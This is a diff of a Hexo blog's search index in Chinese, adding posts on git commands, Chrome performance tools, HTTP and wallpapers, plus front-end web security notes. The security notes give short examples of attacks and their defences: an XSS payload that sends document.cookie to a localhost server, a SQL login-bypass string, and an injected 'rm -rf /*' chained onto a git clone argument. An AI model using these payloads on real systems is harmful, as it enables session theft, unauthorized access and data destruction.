-<li><code>git checkout -b 本地分支名x origin/远程分支名x</code>    一一 拉取远程分支并创建本地分支</li>
-</ul>
-<h4 id="4、fetch指令"><a href="#4、fetch指令" class="headerlink" title="4、fetch指令"></a>4、fetch指令</h4><ul>
-<li><code>git fetch &lt;远程主机名&gt;</code>    一一 将某个远程主机的更新，全部拉取回本地</li>
-<li><code>git fetch &lt;远程主机名&gt; &lt;分支名&gt;</code>    一一 取回特定分支</li>
-<li><code>git fetch origin &lt;remote-branch-name&gt; &lt;local-branch-name&gt;</code>    一一 取回特定分支，并拉取到本地分支</li>
-</ul>
-<h4 id="5、文件暂存"><a href="#5、文件暂存" class="headerlink" title="5、文件暂存"></a>5、文件暂存</h4><ul>
-<li><code>git stash save -a &#39;message&#39;</code>    一一 添加改动到stash</li>
-<li><code>git stash drop &lt;stash@[ID]</code>    一一 删除暂存</li>
-<li><code>git stash list</code>    一一 查看stash列表</li>
-<li><code>git stash clear</code>    一一 删除全部缓存</li>
-<li><code>git stash pop &lt;stash@[ID]&gt;</code>    一一 恢复改动</li>
-<li><code>git apply &lt;stash@[ID]&gt;</code>    一一 将某个暂存取出来并保存stash列表</li>
-</ul>
-<h4 id="6、撤销相关"><a href="#6、撤销相关" class="headerlink" title="6、撤销相关"></a>6、撤销相关</h4><ul>
-<li><code>git checkout -- &lt;file&gt;</code>    一一 撤销“工作区”修改</li>
-<li><code>git reset HEAD &lt;file&gt;</code>    一一 暂存区文件撤销(不覆盖工作区)</li>
-<li><code>git reset --hard &lt;commit ID&gt;</code>    一一 版本回退</li>
-</ul>
-<h4 id="7、差异比较"><a href="#7、差异比较" class="headerlink" title="7、差异比较"></a>7、差异比较</h4><ul>
-<li><code>git diff</code>    一一 比较工作区与缓存区</li>
-<li><code>git diff --cached</code>    一一 比较缓存区与本地库最近一次commit内容</li>
-<li><code>git diff HEAD</code>    一一 比较工作区与本地最近一次commit内容</li>
-<li><code>git diff &lt;commit ID&gt; &lt;commit ID&gt;</code>    一一 比较两个commit之间的差异</li>
-</ul>
-<h4 id="8、Git文件状态"><a href="#8、Git文件状态" class="headerlink" title="8、Git文件状态"></a>8、Git文件状态</h4><p><code>git status</code>查看文件状态</p>
-<ul>
-<li><code>untracked</code>    在暂存区没有该文件</li>
-<li><code>modified</code>      文件发生了修改</li>
-</ul>
-<h4 id="9、分支管理规范"><a href="#9、分支管理规范" class="headerlink" title="9、分支管理规范"></a>9、分支管理规范</h4><ul>
-<li><code>master</code>分支<ul>
-<li>主分支，用于部署生产环境的分支，确保稳定性。</li>
-<li><code>master</code>分支一般由<code>develop</code>以及<code>hotfix</code>分支合并，任何情况下都不能直接修改代码</li>
-</ul>
-</li>
-<li><code>develop</code>分支<ul>
-<li><code>develop</code>为开发分支，通常情况下，保存最新完成及bug修复后的代码。</li>
-<li>开发新功能时，<code>feature</code>分支都是基于<code>develop</code>分支下创建的。</li>
-</ul>
-</li>
-<li><code>feature</code>分支<ul>
-<li>开发新功能，基本上以<code>develop</code>为基础创建<code>feature</code>分支。</li>
-<li>分支命名:<code>feature/</code>开头的为特性分支，命名规则:<code>feature/user_module</code>、<code>feature/cart_module</code>。</li>
-</ul>
-</li>
-<li><code>release</code>分支<ul>
-<li><code>release</code>分支为预上线分支，发布提测阶段，会以<code>release</code>分支代码为基准提测。</li>
-</ul>
-</li>
-<li><code>hotfix</code>分支<ul>
-<li>分支命名:<code>hotfix/</code>开头的为修复分支，命名规则与feature分支类似。</li>
-<li>出现bug时，需要及时修复，以<code>master</code>分支为基线，创建<code>hotfix</code>分支，修复完成后，需要合并到<code>master</code>分支和<code>develop</code>分支。</li>
-</ul>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>版本管理</category>
-      </categories>
-      <tags>
-        <tag>Git</tag>
-        <tag>版本管理</tag>
       </tags>
   </entry>
   <entry>
@@ -591,6 +591,120 @@
       </tags>
   </entry>
   <entry>
+    <title>web安全问题及防御</title>
+    <url>/20200913/111312.html</url>
+    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
+<p>随着互联网的发展，涉及网络安全的问题不可忽视，而作为一名前端工程师，了解网络安全相关的知识也是有必要的，在这里对一些常见的web安全问题及防御手段做个简单的笔记整理。</p>
+</blockquote>
+<a id="more"></a>
+
+<h5 id="1、XSS攻击-跨站点脚本攻击–cross-site-scripting"><a href="#1、XSS攻击-跨站点脚本攻击–cross-site-scripting" class="headerlink" title="1、XSS攻击(跨站点脚本攻击–cross site scripting)"></a>1、XSS攻击(跨站点脚本攻击–cross site scripting)</h5><p>通过存在安全漏洞的web网站注册用户的浏览器内运行非法的HTML标签或Javascript进行的一种攻击。</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">通常会找那些输入框或者地址参数栏进行测试，看是否能执行脚本，是否存在漏洞</span><br><span class="line">例如</span><br><span class="line">	http:<span class="comment">//localhost:3000?from=china;</span></span><br><span class="line">修改成</span><br><span class="line">	http:<span class="comment">//localhost:3000?from=&lt;script&gt;alert(1)&lt;/script&gt;</span></span><br><span class="line"> </span><br><span class="line">如果有弹出框，证明存在漏洞，可以插入脚本进行攻击</span><br><span class="line"></span><br><span class="line">例如</span><br><span class="line">	http:<span class="comment">//localhost:3000?from=&lt;script src=&quot;http://localhost:4000/getImg.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line">	</span><br><span class="line">getImg.js如下:</span><br><span class="line">	<span class="keyword">let</span> img=<span class="keyword">new</span> Image();</span><br><span class="line">	img.src<span class="string">&quot;http://localhost:4000?cookie=document.cookie&quot;</span>;</span><br><span class="line"></span><br><span class="line">这样 http:<span class="comment">//localhost:4000就能通过图片的请求处理拿到客户端的cookie</span></span><br><span class="line">	<span class="keyword">let</span> cookie=req.cookie;</span><br><span class="line">	<span class="built_in">console</span>.log(cookie);</span><br><span class="line">	</span><br><span class="line">XSS的危害:</span><br><span class="line">	<span class="number">1</span>、获取页面数据</span><br><span class="line">	<span class="number">2</span>、获取cookies</span><br><span class="line">	<span class="number">3</span>、发送请求</span><br><span class="line">	<span class="number">4</span>、劫持前端逻辑</span><br><span class="line">	<span class="number">5</span>、偷取网站的任意数据</span><br><span class="line">	<span class="number">6</span>、偷取用户的资料</span><br><span class="line">	<span class="number">7</span>、偷取用户的秘密和登录态</span><br><span class="line">	<span class="number">8</span>、欺骗用户</span><br><span class="line">	</span><br><span class="line">防御手段:</span><br><span class="line"><span class="number">1</span>、响应头部字段X-Xss-Protection</span><br><span class="line">	<span class="number">0</span>：禁止XSS过滤</span><br><span class="line">	<span class="number">1</span>:启用XSS过滤，浏览器默认启用，如果检测到攻击，浏览器将清除页面(删除不安全的部分)</span><br><span class="line">	<span class="number">1</span>;mode=block启用XSS过滤，如果检测到攻击，浏览器将不会清除页面，而是阻塞页面加载</span><br><span class="line">	<span class="number">1</span>;report=(Chromium  only)</span><br><span class="line">	启用XSS过滤。如果检测到跨站脚本攻击，浏览器将清除⻚⾯并使⽤CSP report-uri 指令的功能发送违规报告。</span><br><span class="line"><span class="number">2</span>、ejs转义 </span><br><span class="line">	&lt;% code %&gt;用于执行其中javascript代码</span><br><span class="line">	&lt;%= code %&gt;会对code进行html转义</span><br><span class="line">	&lt;%- code %&gt;将不会进行转义</span><br><span class="line">	</span><br><span class="line"><span class="number">3</span>、CSP(Content Security Policy) 内容安全策略</span><br><span class="line">	script-src:<span class="string">&#x27;self-src&#x27;</span></span><br><span class="line">	</span><br><span class="line"><span class="number">4</span>、转义字符</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>、黑名单和白名单</span><br><span class="line">用户的输入永远不可信任的，最普遍的做法就是转义输⼊输出的内容，对于引号、尖括号、斜</span><br><span class="line">杠进行转义富文本来说，显然不能通过上⾯的办法来转义所有字符，因为这样会把需要的格式也过滤掉。</span><br><span class="line">对于这种情况，通常采用白名单过滤的办法，当然也可以通过黑名单过滤，但是考虑到需要过</span><br><span class="line">滤的标签和标签属性实在太多，更加推荐使用白名单的方式</span><br><span class="line"></span><br><span class="line"><span class="number">6</span>、响应头部字段<span class="built_in">Set</span>-Cookie 设置为HttpOnly  客户端就不能通过<span class="built_in">document</span>.cookie访问到cookie了</span><br><span class="line">	例如:</span><br><span class="line">		res.setHeader(<span class="string">&#x27;Set-Cookit&#x27;</span>,<span class="string">&#x27;uid=123; HttpOnly&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="2、CSRF攻击-跨站伪造请求–cross-site-request-forgery"><a href="#2、CSRF攻击-跨站伪造请求–cross-site-request-forgery" class="headerlink" title="2、CSRF攻击(跨站伪造请求–cross site request forgery)"></a>2、CSRF攻击(跨站伪造请求–cross site request forgery)</h5><p>利用用户已登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作。</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、用户已经登录了站点 A，并在本地记录了 cookie</span><br><span class="line"><span class="number">2</span>、在用户没有登出站点 A 的情况下（也就是 cookie 有效的情况下），访问了恶意攻击者提供的引</span><br><span class="line">诱危险站点 B (B 站点要求访问站点A)。</span><br><span class="line"><span class="number">3</span>、站点 A 没有做任何 CSRF 防御</span><br><span class="line"></span><br><span class="line">CSRF的危害：</span><br><span class="line">	<span class="number">1</span>、利用用户登录态</span><br><span class="line">	<span class="number">2</span>、用户不知情</span><br><span class="line">	<span class="number">3</span>、完成业务请求</span><br><span class="line">	<span class="number">4</span>、盗取用户资金（转账，消费）</span><br><span class="line">	<span class="number">5</span>、冒充用户发帖背锅</span><br><span class="line">	<span class="number">6</span>、损害用站声誉</span><br><span class="line"></span><br><span class="line">防御手段:</span><br><span class="line">	<span class="number">1</span>、referer check  校验来源  但是https不显示referer 而且可伪造</span><br><span class="line">	<span class="number">2</span>、验证码(最有效)</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="3、点击劫持-clickjacking"><a href="#3、点击劫持-clickjacking" class="headerlink" title="3、点击劫持(clickjacking)"></a>3、点击劫持(clickjacking)</h5><p>点击劫持是一种视觉欺骗的攻击手段。攻击者将需要攻击的网站通过 iframe 嵌套的方式式嵌入自己<br>的网页中，并将 iframe 设置为透明，在页面中透出一个按钮诱导用户点击</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">通过视觉欺骗手段将引诱点击的按钮和iframe的网站提交按钮重叠</span><br><span class="line"></span><br><span class="line">防御手段：</span><br><span class="line"><span class="number">1</span>、响应头字段X-IFRAME-OPTIONS</span><br><span class="line">	DENY,表示页面不允许通过iframe的方式展示</span><br><span class="line">	SAMEORIGIN，表示页面可以在相同域名下通过iframe的方式展示</span><br><span class="line">	ARROW-FROM，表示页面可以在指定来源的iframe中显示</span><br><span class="line">	</span><br><span class="line">	res.setHeader(<span class="string">&#x27;X-FRAME-OPTIONS&#x27;</span>,<span class="string">&#x27;DENY)</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	防御用 iframe 嵌套的点击劫持攻击</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">2、JS方式(古老的手段)</span></span><br><span class="line"><span class="string">	判断self是否和top相等</span></span><br><span class="line"><span class="string">	如果相等，则没事，</span></span><br><span class="line"><span class="string">	如果不相等，则为通过iframe来访问的，</span></span><br><span class="line"><span class="string">	让top.location=self.location</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="4、SQL注入"><a href="#4、SQL注入" class="headerlink" title="4、SQL注入"></a>4、SQL注入</h5><p>SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。</p>
+<p>例如特殊”密码”：1’or’1’=’1’</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 拼接后的SQL</span></span><br><span class="line">SELECT *</span><br><span class="line">FROM test.user</span><br><span class="line">WHERE username = <span class="string">&#x27;laowang&#x27;</span></span><br><span class="line">AND password = <span class="string">&#x27;1&#x27;</span>or<span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1&#x27;</span></span><br><span class="line"></span><br><span class="line">用or达到一个怎么都正确的结果</span><br><span class="line"></span><br><span class="line">防御手段:</span><br><span class="line"><span class="number">1</span>、所有的查询语句建议使用数据库提供的参数化查询接口**，参数化的语句使用参数而不是将用户</span><br><span class="line">输入变量嵌入到 SQL 语句中，即不要直接拼接 SQL 语句。例如 Node.js 中的 mysqljs 库的</span><br><span class="line">query 方法中的 ? 占位参数。</span><br><span class="line"><span class="number">2</span>、严格限制Web应用的数据库的操作权限**，给此用户提供仅仅能够满足其工作的最低权限，从而</span><br><span class="line">最大限度的减少注入攻击对数据库的危害</span><br><span class="line"><span class="number">3</span>、后端代码检查输入的数据是否符合预期**，严格限制变量的类型，例如使用正则表达式进行一些</span><br><span class="line">匹配处理。</span><br><span class="line"><span class="number">4</span>、对进入数据库的特殊字符（<span class="string">&#x27;， &quot;， \， &lt;， &gt;， &amp;， *， ; 等）进行转义处理，或编码转换**。基本上</span></span><br><span class="line"><span class="string">所有的后端语言都有对字符串进行转义处理的方法，例如 lodash 的 lodash._escapehtmlchar</span></span><br><span class="line"><span class="string">库</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="5、OS注入"><a href="#5、OS注入" class="headerlink" title="5、OS注入"></a>5、OS注入</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">和SQL差不多，不过是针对操作系统的</span><br><span class="line"><span class="comment">// 以 Node.js 为例，假如在接口中需要从 github 下载用户指定的 repo</span></span><br><span class="line"><span class="keyword">const</span> exec = <span class="built_in">require</span>(<span class="string">&#x27;mz/child_process&#x27;</span>).exec;</span><br><span class="line"><span class="keyword">let</span> params = &#123;<span class="comment">/* 用户输入的参数 */</span>&#125;;</span><br><span class="line">exec(<span class="string">`git clone <span class="subst">$&#123;params.repo&#125;</span> /some/path`</span>);</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//github.com/xx/xx.git &amp;&amp; rm -rf /* &amp;&amp;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="6、请求劫持"><a href="#6、请求劫持" class="headerlink" title="6、请求劫持"></a>6、请求劫持</h5><ul>
+<li><p>DNS劫持</p>
+<blockquote>
+<p>顾名思义， DNS服务器(DNS解析各个步骤)被篡改，修改了域名解析的结果，使得访问到的不是预期的ip</p>
+</blockquote>
+</li>
+<li><p>HTTP劫持 </p>
+<blockquote>
+<p>运营商劫持，此时大概只能升级HTTPS了</p>
+</blockquote>
+<p>  防御手段：    </p>
+<pre><code>  使用https安全协议</code></pre>
+</li>
+</ul>
+<h5 id="7、DDOS攻击-分布式拒绝服务攻击–distributed-denial-of-service"><a href="#7、DDOS攻击-分布式拒绝服务攻击–distributed-denial-of-service" class="headerlink" title="7、DDOS攻击(分布式拒绝服务攻击–distributed denial of service)"></a>7、DDOS攻击(分布式拒绝服务攻击–distributed denial of service)</h5><p>DDOS 不是一种攻击，而是一大类攻击的总称。它有几十种类型，新的攻击方法还在不断发明出来。网站站运行的各个环节，都可以是攻击目标。只要把一个环节攻破，使得整个流程跑不起来，就达到了瘫痪服务的目的。</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">其中，比较常见的一种攻击是 cc 攻击。它就是简单粗暴地送来⼤量正常的请求，超出服务器的最⼤承</span><br><span class="line">受量，导致宕机。</span><br><span class="line"></span><br><span class="line">防御手段：</span><br><span class="line">	<span class="number">1</span>、备份网站</span><br><span class="line">	备份网站不一定是全功能的，如果能做到全静态浏览，就能满足需求。最低限度应该可以显示公</span><br><span class="line">	告，告诉用户，网站出了问题，正在全力抢修。</span><br><span class="line">	<span class="number">2</span>、HTTP 请求的拦截</span><br><span class="line">	<span class="number">3</span>、硬件 服务器 防火墙</span><br><span class="line">	- 带宽扩容 + CDN</span><br><span class="line">	提高犯罪成本</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>使用Chrome开发工具排查页面性能问题</title>
+    <url>/20200925/082122.html</url>
+    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
+<p>学会使用Chrome开发工具来排查、定位、解决影响页面性能的问题，包括内存泄漏、内存膨胀和频繁的垃圾回收等。</p>
+</blockquote>
+<a id="more"></a>
+
+<h5 id="监测浏览器页面的实时内存情况"><a href="#监测浏览器页面的实时内存情况" class="headerlink" title="监测浏览器页面的实时内存情况"></a>监测浏览器页面的实时内存情况</h5><h6 id="1、使用Chrome的任务管理器"><a href="#1、使用Chrome的任务管理器" class="headerlink" title="1、使用Chrome的任务管理器"></a>1、使用Chrome的任务管理器</h6><p>使用<code>shift + Esc</code>组合键打开chrome的任务管理器</p>
+<p><img data-src="/images/202009252008/2-1.png"></p>
+<h6 id="2、使用Performance-monitor"><a href="#2、使用Performance-monitor" class="headerlink" title="2、使用Performance monitor"></a>2、使用Performance monitor</h6><p>第1步：按下<code>F12</code>打开chrome浏览器控制台</p>
+<p><img data-src="/images/202009252008/2-2.png"></p>
+<p>第2步：按下图所示操作，选择Performance monitor工具</p>
+<p><img data-src="/images/202009252008/2-3.png"></p>
+<p>第3步：运行界面如下图所示,可以实时监听页面的CPU使用情况，JS堆，DOM节点数，样式重绘重排等相关信息</p>
+<p><img data-src="/images/202009252008/2-4.png"></p>
+<h5 id="使用Performance"><a href="#使用Performance" class="headerlink" title="使用Performance"></a>使用Performance</h5><p>Chrorme浏览器的performance面板可以让我们查看某些操作时段内页面的各项指标，以此做分析来排查定位页面性能问题。</p>
+<h6 id="第1步：打开Performance面板"><a href="#第1步：打开Performance面板" class="headerlink" title="第1步：打开Performance面板"></a>第1步：打开Performance面板</h6><p>按下<code>F12</code>，打开控制台，然后选择Performance面板</p>
+<p><img data-src="/images/202009252008/2-5.png"></p>
+<p>第2步：点击录制按钮，开始录制监测页面情况</p>
+<p><img data-src="/images/202009252008/2-6.png"></p>
+<p><img data-src="/images/202009252008/2-7.png"></p>
+<p>第3步：在页面中进行一些操作之后，比如按下按钮、布局切换隐藏等、增加DOM节点、使用动画等，然后点击如图所示的<code>stop</code>按钮，停止监测,会得到如图所示的分析内容</p>
+<p><img data-src="/images/202009252008/2-8.png"></p>
+<h5 id="Performance面板分析"><a href="#Performance面板分析" class="headerlink" title="Performance面板分析"></a>Performance面板分析</h5><p>从上到下，可以将面板分为<strong>控制面板</strong>、<strong>概览面板</strong>、<strong>主面板</strong>、<strong>统计面板</strong></p>
+<p><img data-src="/images/202009252008/2-9.png"></p>
+<h6 id="控制面板"><a href="#控制面板" class="headerlink" title="控制面板"></a>控制面板</h6><p>使用控制面板可以模拟不同的网络和不同的CPU能力来进行测试</p>
+<p><img data-src="/images/202009252008/2-10.png"></p>
+<p><img data-src="/images/202009252008/2-11.png"></p>
+<h6 id="概览面板"><a href="#概览面板" class="headerlink" title="概览面板"></a>概览面板</h6><p>该面板从上到下分别为：</p>
+<ul>
+<li>FPS图表    当你在该图表看到红色元素越多时候，说明FPS低，如果绿色元素居多，则FPS高，用户体验较好</li>
+<li>CPU图表   该图表和统计面板的summary选项卡展示是对应的</li>
+<li>NET图表   该图表显示页面的一些快照，对于一些动画分析还是挺好用的</li>
+<li>HEAP图表 监测页面运行时JS堆的相关情况</li>
+</ul>
+<p><img data-src="/images/202009252008/2-12.png"></p>
+<h6 id="主面板"><a href="#主面板" class="headerlink" title="主面板"></a>主面板</h6><p>在主面板上拖拽鼠标来放大某个帧事件的展示，包括FPS、CPU、JS Heap等信息</p>
+<p>这块内容，如果要做性能分析，需要比较关注的点是右上角有红色标识的事件，可以重点分析该事件，找到影响性能的关键点，以此一步步进行优化。</p>
+<p><img data-src="/images/202009252008/2-13.png"></p>
+<h6 id="统计面板"><a href="#统计面板" class="headerlink" title="统计面板"></a>统计面板</h6><p><img data-src="/images/202009252008/2-13-1.png"></p>
+<ul>
+<li>Summary ：展示各个事件阶段耗费的时间</li>
+<li>Bottom-Up 排序：可以看到各个事件消耗时间排序 ，<code>self-time</code> 指除去子事件这个事件本身消耗的时间 ，<code>total-time</code> 这个事件从开始到结束消耗的时间（包含子事件）</li>
+<li>Call Tree 调用栈：<code>Main</code>选择一个事件，可以看到整个事件的调用栈（从最顶层到最底层，而不是只有当前事件）</li>
+<li>Event Log 事件日志 ：<code>start time</code>，指事件在多少毫秒开始触发的，右边有事件描述信息</li>
+</ul>
+<h5 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h5><p>Chrome开发者工具中文文档：<a href="https://developers.google.cn/web/tools/chrome-devtools?hl=zh-cn">https://developers.google.cn/web/tools/chrome-devtools?hl=zh-cn</a></p>
+]]></content>
+      <categories>
+        <category>性能优化</category>
+      </categories>
+      <tags>
+        <tag>前端</tag>
+        <tag>开发工具</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>使用Hexo和Gitee Pages搭建个人博客</title>
     <url>/20200905/050927.html</url>
     <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><blockquote>
@@ -625,6 +739,28 @@
       </categories>
       <tags>
         <tag>hexo</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>壁纸分享</title>
+    <url>/20200924/060026.html</url>
+    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
+<p>分享几张自己喜欢的高清壁纸，安利一个超高清壁纸站点：<a href="https://wallhaven.cc/">https://wallhaven.cc/</a>  ，拥有非常多的原画/二次元类型的壁纸提供挑选，可以选择自己喜欢风格的壁纸进行下载(<em>^_^</em>)。</p>
+</blockquote>
+<a id="more"></a>
+
+<p><img data-src="/images/202009241806/bizhi1.jpg"></p>
+<p><img data-src="/images/202009241806/bizhi2.jpg"></p>
+<p><img data-src="/images/202009241806/bizhi3.jpg"></p>
+<p><img data-src="/images/202009241806/bizhi4.jpg"></p>
+<p><img data-src="/images/202009241806/bizhi5.jpg"></p>
+<p><img data-src="/images/202009241806/bizhi6.jpg"></p>
+]]></content>
+      <categories>
+        <category>壁纸</category>
+      </categories>
+      <tags>
+        <tag>壁纸</tag>
       </tags>
   </entry>
   <entry>
@@ -750,164 +886,566 @@
       </tags>
   </entry>
   <entry>
-    <title>web安全问题及防御</title>
-    <url>/20200913/111312.html</url>
-    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
-<p>随着互联网的发展，涉及网络安全的问题不可忽视，而作为一名前端工程师，了解网络安全相关的知识也是有必要的，在这里对一些常见的web安全问题及防御手段做个简单的笔记整理。</p>
+    <title>HTTP笔记整理</title>
+    <url>/20201006/081025.html</url>
+    <content><![CDATA[<h5 id="HTTP（Hypertext-Transfer-Protocal）协议"><a href="#HTTP（Hypertext-Transfer-Protocal）协议" class="headerlink" title="HTTP（Hypertext Transfer Protocal）协议"></a>HTTP（Hypertext Transfer Protocal）协议</h5><blockquote>
+<p>a stateless application-level request/response protocal that uses extensible semantics and self-descriptive message payloads for flexible interaction with network-based hypertext information systems（RFC7230 2014.6）</p>
+<p>一种无状态的、应用层的、以请求/应答方式运行的协议，它使用可扩展的语义和自描述消息格式，与基于网络的超文本信息系统灵活的互动。</p>
 </blockquote>
 <a id="more"></a>
 
-<h5 id="1、XSS攻击-跨站点脚本攻击–cross-site-scripting"><a href="#1、XSS攻击-跨站点脚本攻击–cross-site-scripting" class="headerlink" title="1、XSS攻击(跨站点脚本攻击–cross site scripting)"></a>1、XSS攻击(跨站点脚本攻击–cross site scripting)</h5><p>通过存在安全漏洞的web网站注册用户的浏览器内运行非法的HTML标签或Javascript进行的一种攻击。</p>
-<pre><code>通常会找那些输入框或者地址参数栏进行测试，看是否能执行脚本，是否存在漏洞
-例如
-    http://localhost:3000?from=china;
-修改成
-    http://localhost:3000?from=&lt;script&gt;alert(1)&lt;/script&gt;
-
-如果有弹出框，证明存在漏洞，可以插入脚本进行攻击
-
-例如
-    http://localhost:3000?from=&lt;script src=&quot;http://localhost:4000/getImg.js&quot;&gt;&lt;/script&gt;
-
-getImg.js如下:
-    let img=new Image();
-    img.src&quot;http://localhost:4000?cookie=document.cookie&quot;;
-
-这样 http://localhost:4000就能通过图片的请求处理拿到客户端的cookie
-    let cookie=req.cookie;
-    console.log(cookie);
-
-XSS的危害:
-    1、获取页面数据
-    2、获取cookies
-    3、发送请求
-    4、劫持前端逻辑
-    5、偷取网站的任意数据
-    6、偷取用户的资料
-    7、偷取用户的秘密和登录态
-    8、欺骗用户
-
-防御手段:
-1、响应头部字段X-Xss-Protection
-    0：禁止XSS过滤
-    1:启用XSS过滤，浏览器默认启用，如果检测到攻击，浏览器将清除页面(删除不安全的部分)
-    1;mode=block启用XSS过滤，如果检测到攻击，浏览器将不会清除页面，而是阻塞页面加载
-    1;report=(Chromium  only)
-    启用XSS过滤。如果检测到跨站脚本攻击，浏览器将清除⻚⾯并使⽤CSP report-uri 指令的功能发送违规报告。
-2、ejs转义 
-    &lt;% code %&gt;用于执行其中javascript代码
-    &lt;%= code %&gt;会对code进行html转义
-    &lt;%- code %&gt;将不会进行转义
-
-3、CSP(Content Security Policy) 内容安全策略
-    script-src:&#39;self-src&#39;
-
-4、转义字符
-
-5、黑名单和白名单
-用户的输入永远不可信任的，最普遍的做法就是转义输⼊输出的内容，对于引号、尖括号、斜
-杠进行转义富文本来说，显然不能通过上⾯的办法来转义所有字符，因为这样会把需要的格式也过滤掉。
-对于这种情况，通常采用白名单过滤的办法，当然也可以通过黑名单过滤，但是考虑到需要过
-滤的标签和标签属性实在太多，更加推荐使用白名单的方式
-
-6、响应头部字段Set-Cookie 设置为HttpOnly  客户端就不能通过document.cookie访问到cookie了
-    例如:
-        res.setHeader(&#39;Set-Cookit&#39;,&#39;uid=123; HttpOnly&#39;)</code></pre>
-<h5 id="2、CSRF攻击-跨站伪造请求–cross-site-request-forgery"><a href="#2、CSRF攻击-跨站伪造请求–cross-site-request-forgery" class="headerlink" title="2、CSRF攻击(跨站伪造请求–cross site request forgery)"></a>2、CSRF攻击(跨站伪造请求–cross site request forgery)</h5><p>利用用户已登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作。</p>
-<pre><code>1、用户已经登录了站点 A，并在本地记录了 cookie
-2、在用户没有登出站点 A 的情况下（也就是 cookie 有效的情况下），访问了恶意攻击者提供的引
-诱危险站点 B (B 站点要求访问站点A)。
-3、站点 A 没有做任何 CSRF 防御
-
-CSRF的危害：
-    1、利用用户登录态
-    2、用户不知情
-    3、完成业务请求
-    4、盗取用户资金（转账，消费）
-    5、冒充用户发帖背锅
-    6、损害用站声誉
-
-防御手段:
-    1、referer check  校验来源  但是https不显示referer 而且可伪造
-    2、验证码(最有效)</code></pre>
-<h5 id="3、点击劫持-clickjacking"><a href="#3、点击劫持-clickjacking" class="headerlink" title="3、点击劫持(clickjacking)"></a>3、点击劫持(clickjacking)</h5><p>点击劫持是一种视觉欺骗的攻击手段。攻击者将需要攻击的网站通过 iframe 嵌套的方式式嵌入自己<br>的网页中，并将 iframe 设置为透明，在页面中透出一个按钮诱导用户点击</p>
-<pre><code>通过视觉欺骗手段将引诱点击的按钮和iframe的网站提交按钮重叠
-
-防御手段：
-1、响应头字段X-IFRAME-OPTIONS
-    DENY,表示页面不允许通过iframe的方式展示
-    SAMEORIGIN，表示页面可以在相同域名下通过iframe的方式展示
-    ARROW-FROM，表示页面可以在指定来源的iframe中显示
-
-    res.setHeader(&#39;X-FRAME-OPTIONS&#39;,&#39;DENY)
-
-    防御用 iframe 嵌套的点击劫持攻击
-
-2、JS方式(古老的手段)
-    判断self是否和top相等
-    如果相等，则没事，
-    如果不相等，则为通过iframe来访问的，
-    让top.location=self.location</code></pre>
-<h5 id="4、SQL注入"><a href="#4、SQL注入" class="headerlink" title="4、SQL注入"></a>4、SQL注入</h5><p>SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。</p>
-<p>例如特殊”密码”：1’or’1’=’1’</p>
-<pre><code>// 拼接后的SQL
-SELECT *
-FROM test.user
-WHERE username = &#39;laowang&#39;
-AND password = &#39;1&#39;or&#39;1&#39;=&#39;1&#39;
-
-用or达到一个怎么都正确的结果
-
-防御手段:
-1、所有的查询语句建议使用数据库提供的参数化查询接口**，参数化的语句使用参数而不是将用户
-输入变量嵌入到 SQL 语句中，即不要直接拼接 SQL 语句。例如 Node.js 中的 mysqljs 库的
-query 方法中的 ? 占位参数。
-2、严格限制Web应用的数据库的操作权限**，给此用户提供仅仅能够满足其工作的最低权限，从而
-最大限度的减少注入攻击对数据库的危害
-3、后端代码检查输入的数据是否符合预期**，严格限制变量的类型，例如使用正则表达式进行一些
-匹配处理。
-4、对进入数据库的特殊字符（&#39;， &quot;， \， &lt;， &gt;， &amp;， *， ; 等）进行转义处理，或编码转换**。基本上
-所有的后端语言都有对字符串进行转义处理的方法，例如 lodash 的 lodash._escapehtmlchar
-库</code></pre>
-<h5 id="5、OS注入"><a href="#5、OS注入" class="headerlink" title="5、OS注入"></a>5、OS注入</h5><pre><code>和SQL差不多，不过是针对操作系统的
-// 以 Node.js 为例，假如在接口中需要从 github 下载用户指定的 repo
-const exec = require(&#39;mz/child_process&#39;).exec;
-let params = &#123;/* 用户输入的参数 */&#125;;
-exec(`git clone $&#123;params.repo&#125; /some/path`);
-
-https://github.com/xx/xx.git &amp;&amp; rm -rf /* &amp;&amp;</code></pre>
